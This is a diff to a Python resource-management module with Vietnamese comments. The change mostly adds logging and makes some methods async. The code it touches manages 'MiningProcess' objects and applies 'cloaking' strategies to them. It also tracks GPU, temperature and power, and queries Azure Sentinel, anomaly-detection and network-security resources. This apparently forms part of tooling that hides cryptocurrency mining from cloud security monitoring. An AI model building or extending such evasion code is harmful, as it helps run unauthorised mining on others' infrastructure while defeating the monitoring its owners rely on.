@@ -13,6 +13,8 @@ from contextlib import asynccontextmanager
 import aiofiles
 import aiorwlock
 
+# [ĐỀ XUẤT] => Tăng cường logging trong ResourceManager, SharedResourceManager, ...
+# Ngoài ra, chỉ xử lý code trong resource_manager.py theo yêu cầu.
 
 from .utils import MiningProcess
 from .cloak_strategies import CloakStrategyFactory
@@ -75,23 +77,26 @@ class SharedResourceManager:
 
     def __init__(self, config: ConfigModel, logger: logging.Logger, resource_managers: Dict[str, Any]):
         self.logger = logger
-        self.logger.info("Khởi tạo SharedResourceManager...")
-        
+        # [ĐỀ XUẤT] => Tăng cường log khi bắt đầu khởi tạo
+        self.logger.info("Khởi tạo SharedResourceManager... (BẮT ĐẦU)")
+
         try:
             self.config = config
             self.resource_managers = resource_managers
             self.power_manager = PowerManager()
             self.strategy_cache = {}
-            
+
             # Khởi tạo NVML
             self._nvml_init = False  # Trạng thái khởi tạo NVML
-            self.logger.info("Đang khởi tạo NVML...")
+            self.logger.debug("SharedResourceManager: Gọi self.initialize_nvml()")
             self.initialize_nvml()
             self.logger.info("SharedResourceManager đã được khởi tạo thành công.")
         except Exception as e:
             self.logger.error(f"Lỗi khi khởi tạo SharedResourceManager: {e}\n{traceback.format_exc()}")
             raise RuntimeError("Không thể khởi tạo SharedResourceManager.") from e
-    
+        finally:
+            self.logger.info("Khởi tạo SharedResourceManager... (KẾT THÚC)")
+
     def is_nvml_initialized(self) -> bool:
         """Kiểm tra pynvml đã khởi tạo hay chưa."""
         return self._nvml_init
@@ -168,6 +173,7 @@ class SharedResourceManager:
         """
         try:
             if not self.is_nvml_initialized():
+                self.logger.debug("_sync_get_gpu_usage_percent: NVML chưa init, tiến hành init.")
                 self.initialize_nvml()
 
             if not self._nvml_init:
@@ -233,7 +239,7 @@ class SharedResourceManager:
                 f"Lỗi không xác định khi cloaking '{strategy_name}' cho {name} (PID={pid}): {e}\n{traceback.format_exc()}"
             )
             raise
-
+        
     async def restore_resources(self, process: MiningProcess):
         """
         Khôi phục tài nguyên cho tiến trình đã cloaked.
@@ -244,7 +250,7 @@ class SharedResourceManager:
             restored = False
 
             for controller_name, manager in self.resource_managers.items():
-                success = await asyncio.get_event_loop().run_in_executor(None, manager.restore_resources, pid)
+                success = await manager.restore_resources(pid)  # Trực tiếp await phương thức async
                 if success:
                     self.logger.info(f"Đã khôi phục tài nguyên '{controller_name}' cho PID={pid}.")
                     restored = True
@@ -254,7 +260,7 @@ class SharedResourceManager:
             if restored:
                 self.logger.info(f"Khôi phục xong tài nguyên cho {name} (PID: {pid}).")
             else:
-                self.logger.warning(f"Không tìm thấy tài nguyên nào cần khôi phục cho {name} (PID: {pid}).")
+                self.logger.warning(f"Không tìm thấy tài nguyên nào cần khôi phục cho {name} (PID={pid}).")
 
         except psutil.NoSuchProcess:
             self.logger.error(f"Tiến trình PID={process.pid} không tồn tại khi khôi phục tài nguyên.")
@@ -286,12 +292,15 @@ class ResourceManager(IResourceManager):
         return cls._instance
 
     def __init__(self, config: ConfigModel, event_bus: EventBus, logger: logging.Logger):
+        # [ĐỀ XUẤT] => Thêm check để tránh init nhiều lần
         if hasattr(self, '_initialized') and self._initialized:
             return
-        self._initialized = True
 
+        self._initialized = True
         self.logger = logger
-        self.logger.info("Khởi tạo ResourceManager...")
+
+        # [ĐỀ XUẤT] => Logging chi tiết khi bắt đầu init
+        self.logger.info("ResourceManager.__init__ (BẮT ĐẦU)")
 
         try:
             self.config = config
@@ -315,65 +324,78 @@ class ResourceManager(IResourceManager):
             # Đặt trạng thái khởi tạo của SharedResourceManager thành None
             self.shared_resource_manager: Optional[SharedResourceManager] = None
 
-            self.logger.info("Đăng ký lắng nghe sự kiện resource_adjustment...")
+            self.logger.debug("ResourceManager.__init__: Đăng ký lắng nghe sự kiện 'resource_adjustment'")
             self.event_bus.subscribe('resource_adjustment', self.handle_resource_adjustment)
+
+            self.logger.info("ResourceManager.__init__ (KẾT THÚC)")
 
         except Exception as e:
             self.logger.error(f"Lỗi trong ResourceManager.__init__: {e}\n{traceback.format_exc()}")
             raise RuntimeError("Không thể khởi tạo ResourceManager.") from e
-        
+
     async def start(self):
         """
         Khởi động ResourceManager.
         """
-        self.logger.info("Bắt đầu khởi động ResourceManager...")
-
+        self.logger.info("ResourceManager.start() - BẮT ĐẦU")
         try:
+            # [ĐỀ XUẤT] => Tăng cường log chi tiết
+            self.logger.info("ResourceManager.start() - Tạo resource_managers từ ResourceControlFactory...")
             resource_managers = await ResourceControlFactory.create_resource_managers(logger=self.logger)
+            self.logger.info("ResourceManager.start() - Đã gọi create_resource_managers xong.")
+
             if not resource_managers:
-                raise RuntimeError("Không thể tạo ResourceControlFactory managers.")
-            
+                raise RuntimeError("Không thể tạo ResourceControlFactory managers (trả về None hoặc rỗng).")
+
+            self.logger.info("ResourceManager.start() - Khởi tạo SharedResourceManager...")
             self.shared_resource_manager = SharedResourceManager(self.config, self.logger, resource_managers)
-            if not self.shared_resource_manager:
-                raise RuntimeError("SharedResourceManager không được khởi tạo.")
+            self.logger.info("ResourceManager.start() - Đã khởi tạo SharedResourceManager xong.")
 
-            # Khởi tạo Azure Clients
+            self.logger.info("ResourceManager.start() - Gọi initialize_azure_clients()...")
             self.initialize_azure_clients()
-            self.logger.info("Azure clients đã được khởi tạo.")
+            self.logger.info("ResourceManager.start() - Đã initialize_azure_clients xong.")
 
-            # Khám phá tài nguyên Azure
+            self.logger.info("ResourceManager.start() - Khám phá tài nguyên Azure...")
             await self.discover_azure_resources()
+            self.logger.info("ResourceManager.start() - Đã khám phá tài nguyên Azure xong.")
 
-            # Khởi động các watcher & consumer
+            self.logger.info("ResourceManager.start() - Bắt đầu khởi tạo watchers...")
             await self.start_watchers()
+            self.logger.info("ResourceManager.start() - Hoàn tất khởi tạo watchers.")
 
             self.logger.info("ResourceManager đã khởi động thành công.")
+            self.logger.info("ResourceManager.start() - KẾT THÚC")
+
         except Exception as e:
             self.logger.error(f"Lỗi khi khởi động ResourceManager: {e}\n{traceback.format_exc()}")
-            await self.shutdown()
+            await self.shutdown()  # shutdown nếu lỗi
             raise
 
     def initialize_azure_clients(self):
         """Khởi tạo các client tương tác với Azure."""
+        self.logger.debug("ResourceManager.initialize_azure_clients: Bắt đầu tạo Azure Clients.")
         self.azure_sentinel_client = AzureSentinelClient(self.logger)
         self.azure_log_analytics_client = AzureLogAnalyticsClient(self.logger)
         self.azure_network_watcher_client = AzureNetworkWatcherClient(self.logger)
         self.azure_anomaly_detector_client = AzureAnomalyDetectorClient(self.logger, self.config)
+        self.logger.debug("ResourceManager.initialize_azure_clients: Tạo Azure Clients thành công.")
 
-    def discover_azure_resources(self):
+    async def discover_azure_resources(self):
         """Khám phá tài nguyên Azure (Network Watchers, NSGs...)."""
         try:
+            self.logger.debug("ResourceManager.discover_azure_resources: Khám phá Network Watchers.")
             self.network_watchers = self.azure_network_watcher_client.discover_resources(
                 'Microsoft.Network/networkWatchers'
             )
             self.logger.info(f"Khám phá {len(self.network_watchers)} Network Watchers.")
 
+            self.logger.debug("ResourceManager.discover_azure_resources: Khám phá NSGs.")
             self.nsgs = self.azure_network_watcher_client.discover_resources(
                 'Microsoft.Network/networkSecurityGroups'
             )
             self.logger.info(f"Khám phá {len(self.nsgs)} NSGs.")
 
-            self.logger.info("Khám phá Traffic Analytics Workspaces đã bị loại bỏ.")
+            self.logger.info("Khám phá Traffic Analytics Workspaces đã bị loại bỏ (nếu có).")
         except Exception as e:
             self.logger.error(f"Lỗi khám phá Azure: {e}\n{traceback.format_exc()}")
 
@@ -441,8 +463,15 @@ class ResourceManager(IResourceManager):
         """
         Xử lý các sự kiện điều chỉnh tài nguyên từ EventBus.
         """
-        await self.resource_adjustment_queue.put(task)
-        self.logger.info(f"Đã nhận sự kiện điều chỉnh tài nguyên: {task['type']} cho PID={task.get('process').pid}")
+        # [ĐỀ XUẤT] => Log rõ ràng khi nhận sự kiện
+        try:
+            await self.resource_adjustment_queue.put(task)
+            self.logger.info(
+                f"Đã nhận sự kiện điều chỉnh tài nguyên: {task['type']} "
+                f"cho PID={task.get('process').pid if 'process' in task else 'N/A'}"
+            )
+        except Exception as e:
+            self.logger.error(f"Lỗi khi handle_resource_adjustment: {e}\n{traceback.format_exc()}")
 
     async def enqueue_cloaking(self, process: MiningProcess):
         """Thêm vào queue để cloaking."""
@@ -490,7 +519,9 @@ class ResourceManager(IResourceManager):
                     for strategy in task['strategies']:
                         if strategy not in self.shared_resource_manager.strategy_cache:
                             strategy_instance = CloakStrategyFactory.create_strategy(
-                                strategy, self.config, self.logger,
+                                strategy,
+                                self.config,
+                                self.logger,
                                 self.shared_resource_manager.resource_managers
                             )
                             self.shared_resource_manager.strategy_cache[strategy] = strategy_instance
@@ -635,6 +666,7 @@ class ResourceManager(IResourceManager):
 
     async def start_watchers(self):
         """Khởi tạo watchers & queue consumer dưới dạng asyncio Task."""
+        self.logger.debug("ResourceManager.start_watchers: Khởi tạo các watcher tasks.")
         self.watchers.append(asyncio.create_task(self.temperature_watcher()))
         self.watchers.append(asyncio.create_task(self.power_watcher()))
         self.watchers.append(asyncio.create_task(self.process_resource_adjustments()))
@@ -645,7 +677,7 @@ class ResourceManager(IResourceManager):
         """
         Dừng ResourceManager và giải phóng tài nguyên.
         """
-        self.logger.info("Dừng ResourceManager...")
+        self.logger.info("Dừng ResourceManager... (BẮT ĐẦU)")
         self.stop_event.set()
 
         # Hủy các watchers
@@ -667,5 +699,4 @@ class ResourceManager(IResourceManager):
                         tasks.append(self.shared_resource_manager.restore_resources(proc))
             await asyncio.gather(*tasks, return_exceptions=True)
 
-        self.logger.info("ResourceManager đã dừng.")
-
+        self.logger.info("ResourceManager đã dừng. (KẾT THÚC)")
